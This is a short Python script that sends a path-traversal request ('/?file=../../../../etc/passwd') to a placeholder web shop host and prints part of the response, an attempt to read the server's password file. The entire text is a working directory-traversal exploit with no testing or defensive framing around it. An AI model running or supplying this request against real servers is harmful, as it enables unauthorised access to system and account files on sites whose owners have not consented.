import http.client
TARGET = "shop.example.com"
c = http.client.HTTPConnection(TARGET, 80, timeout=3)
c.request("GET", "/?file=../../../../etc/passwd")
print(c.getresponse().read()[:200])
